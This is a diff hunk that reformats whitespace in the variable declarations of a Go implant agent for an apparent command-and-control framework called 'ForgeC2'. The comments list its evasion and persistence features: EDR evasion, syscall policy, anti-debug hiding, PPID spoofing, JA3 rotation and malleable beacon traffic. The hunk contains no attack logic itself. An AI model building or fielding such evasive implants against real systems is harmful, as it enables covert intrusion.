@@ -63,46 +63,46 @@ var (
 	// envelope can be recovered (without it the profile-preset C2 pipeline is
 	// dead for the live agent). Delivered over-the-wire when a profile is set.
 	MalleableRespDecode     string            = ""
-	MalleableAppend         string            = ""                            // bytes appended to every HTTP beacon response body (server malleable profile)
-	MalleableRequestPrepend string            = ""                            // bytes prepended to the agent's OUTGOING HTTP beacon body (server strips on inbound)
-	MalleableRequestAppend  string            = ""                            // bytes appended to the agent's OUTGOING HTTP beacon body (server strips on inbound)
-	MalleableRequestHeaders map[string]string = nil                           // extra request headers sent on outbound beacons (e.g. Host/Cookie shaping)
-	RequestHeaderPoolStr    string            = ""                            // v2 decoy header pool ("Name: value" lines, one random entry per beacon)
-	MalleableClientID       string            = ""                            // v2 client id chain (wire form, audit/preview)
-	MalleableClientMeta     string            = ""                            // v2 client metadata chain (wire form)
-	BeaconURIsStr           string            = ""                            // v2 comma-joined rotation list (primary is BeaconURI)
-	BeaconParameterStr      string            = ""                            // v2 POST parameter name
-	MalleablePlacementStr   string            = ""                            // v2 placements JSON [{target,chain}] cover copies
-	UserAgentsStr           string            = ""                            // v2 UA rotation pool, newline-joined
-	JitterURIStr            string            = ""                            // v2 URI jitter flag ("true" = junk query per beacon)
-	ParameterNamesStr       string            = ""                            // v2 query param name pool, newline-joined
-	ExpiryDateStr           string            = ""                            // Compile-time expiry date: "YYYY-MM-DD" — implant auto-exits after this date
-	EvasionStr              string            = "false"                       // Compile-time EDR evasion (chunked sleep); also FORGEC2_EVASION=1 at runtime
-	SyscallPolicyStr        string            = "false"                       // Direct/indirect syscall policy; independent of sleep-mask opt-in. also FORGEC2_SYSCALL_POLICY=1 at runtime
-	GhostModeStr            string            = "false"                       // Compile-time ghost protocol (sandbox/anti-debug deep-hiding); also FORGEC2_GHOST_MODE=1 at runtime
-	PPIDSpoofStr            string            = "false"                       // Compile-time PPID spoofing
-	PPIDSpoofParent         string            = "explorer.exe"                // Parent process name used for PPID spoofing
-	PersistencePrefixStr    string            = ""                            // Custom prefix for persistence artifacts (reg keys, task names, file names); default "ForgeC2"
-	BeaconTransportStr      string            = "http"                        // "http", "wss", "ssh" — transport protocol for beacon
-	ChameleonStr            string            = "false"                       // per-dial uTLS JA3 rotation (off = stable Chrome Auto); also FORGEC2_CHAMELEON=1 at runtime
-	ChameleonProfileStr     string            = "random"                      // chrome|firefox|safari|edge|ios|android|360|qq|random or a full utls profile name; also FORGEC2_CHAMELEON_PROFILE at runtime
-	SMBPipeName             string            = ""                            // named pipe name for SMB transport (defaults to persistencePrefix)
-	IsSMBParentStr          string            = "false"                       // "true" = this agent is an SMB parent (listens on pipe)
+	MalleableAppend         string            = ""             // bytes appended to every HTTP beacon response body (server malleable profile)
+	MalleableRequestPrepend string            = ""             // bytes prepended to the agent's OUTGOING HTTP beacon body (server strips on inbound)
+	MalleableRequestAppend  string            = ""             // bytes appended to the agent's OUTGOING HTTP beacon body (server strips on inbound)
+	MalleableRequestHeaders map[string]string = nil            // extra request headers sent on outbound beacons (e.g. Host/Cookie shaping)
+	RequestHeaderPoolStr    string            = ""             // v2 decoy header pool ("Name: value" lines, one random entry per beacon)
+	MalleableClientID       string            = ""             // v2 client id chain (wire form, audit/preview)
+	MalleableClientMeta     string            = ""             // v2 client metadata chain (wire form)
+	BeaconURIsStr           string            = ""             // v2 comma-joined rotation list (primary is BeaconURI)
+	BeaconParameterStr      string            = ""             // v2 POST parameter name
+	MalleablePlacementStr   string            = ""             // v2 placements JSON [{target,chain}] cover copies
+	UserAgentsStr           string            = ""             // v2 UA rotation pool, newline-joined
+	JitterURIStr            string            = ""             // v2 URI jitter flag ("true" = junk query per beacon)
+	ParameterNamesStr       string            = ""             // v2 query param name pool, newline-joined
+	ExpiryDateStr           string            = ""             // Compile-time expiry date: "YYYY-MM-DD" — implant auto-exits after this date
+	EvasionStr              string            = "false"        // Compile-time EDR evasion (chunked sleep); also FORGEC2_EVASION=1 at runtime
+	SyscallPolicyStr        string            = "false"        // Direct/indirect syscall policy; independent of sleep-mask opt-in. also FORGEC2_SYSCALL_POLICY=1 at runtime
+	GhostModeStr            string            = "false"        // Compile-time ghost protocol (sandbox/anti-debug deep-hiding); also FORGEC2_GHOST_MODE=1 at runtime
+	PPIDSpoofStr            string            = "false"        // Compile-time PPID spoofing
+	PPIDSpoofParent         string            = "explorer.exe" // Parent process name used for PPID spoofing
+	PersistencePrefixStr    string            = ""             // Custom prefix for persistence artifacts (reg keys, task names, file names); default "ForgeC2"
+	BeaconTransportStr      string            = "http"         // "http", "wss", "ssh" — transport protocol for beacon
+	ChameleonStr            string            = "false"        // per-dial uTLS JA3 rotation (off = stable Chrome Auto); also FORGEC2_CHAMELEON=1 at runtime
+	ChameleonProfileStr     string            = "random"       // chrome|firefox|safari|edge|ios|android|360|qq|random or a full utls profile name; also FORGEC2_CHAMELEON_PROFILE at runtime
+	SMBPipeName             string            = ""             // named pipe name for SMB transport (defaults to persistencePrefix)
+	IsSMBParentStr          string            = "false"        // "true" = this agent is an SMB parent (listens on pipe)
 
 	// Runtime state for the independent syscall policy (option B): shared with
 	// syscall_policy_windows.go so startup resolution is testable and observable.
-	syscallPolicyEnabled   bool                // runtime: syscall policy engaged (parsed from SyscallPolicyStr / FORGEC2_SYSCALL_POLICY)
-	syscallPolicyResolved  bool                // runtime: startup resolution completed
-	syscallPolicySource    string            // runtime: ntdll file the table was resolved from
-	syscallPolicyFailed    []string          // runtime: required syscalls that failed to resolve
-	SSHUserStr             string            = ""                            // SSH username for SSH transport (defaults to persistencePrefix)
-	SSHPasswordStr          string            = ""                            // SSH password for SSH transport
-	SSHKeyStr               string            = ""                            // base64-encoded PEM private key for SSH transport
-	SSHHostKeyStr           string            = ""                            // base64 server host public key (pin); empty = SSH transport refuses to connect
-	EgressDetectionStr      string            = "false"                       // enable egress detection on startup
-	EgressPortsStr          string            = "80,443,8080,8443,53,22,2222" // ports to test for egress
-	StartDelayMinStr        string            = "0"                           // startup delay window floor, seconds (0 = disabled)
-	StartDelayMaxStr        string            = "0"                           // startup delay window ceiling, seconds (0 = disabled)
+	syscallPolicyEnabled  bool                                     // runtime: syscall policy engaged (parsed from SyscallPolicyStr / FORGEC2_SYSCALL_POLICY)
+	syscallPolicyResolved bool                                     // runtime: startup resolution completed
+	syscallPolicySource   string                                   // runtime: ntdll file the table was resolved from
+	syscallPolicyFailed   []string                                 // runtime: required syscalls that failed to resolve
+	SSHUserStr            string   = ""                            // SSH username for SSH transport (defaults to persistencePrefix)
+	SSHPasswordStr        string   = ""                            // SSH password for SSH transport
+	SSHKeyStr             string   = ""                            // base64-encoded PEM private key for SSH transport
+	SSHHostKeyStr         string   = ""                            // base64 server host public key (pin); empty = SSH transport refuses to connect
+	EgressDetectionStr    string   = "false"                       // enable egress detection on startup
+	EgressPortsStr        string   = "80,443,8080,8443,53,22,2222" // ports to test for egress
+	StartDelayMinStr      string   = "0"                           // startup delay window floor, seconds (0 = disabled)
+	StartDelayMaxStr      string   = "0"                           // startup delay window ceiling, seconds (0 = disabled)
 
 	// Certificate pinning (SHA-256 hex of server DER cert; empty = disabled)
 	PinnedCertSHA256Str string = ""
